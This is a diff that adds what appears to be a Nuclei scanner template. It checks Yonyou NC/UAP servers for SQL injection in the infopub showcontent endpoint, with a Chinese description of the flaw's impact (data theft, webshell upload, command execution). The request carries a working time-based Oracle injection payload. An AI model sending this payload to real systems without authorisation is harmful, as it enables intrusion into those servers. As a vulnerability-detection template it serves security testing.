@@ -1,0 +1,24 @@
+id: yonyou-nc-infopub-sqli
+
+info:
+  name: yonyou-nc-infopub-sqli
+  author: apple
+  severity: high
+  description: 用友 infopub 存在SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。web.title=="Yonyou UAP"||web.title=="YONYOU NC"
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        GET /ebvp/infopub/showcontent?id=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,5)-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: identity
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
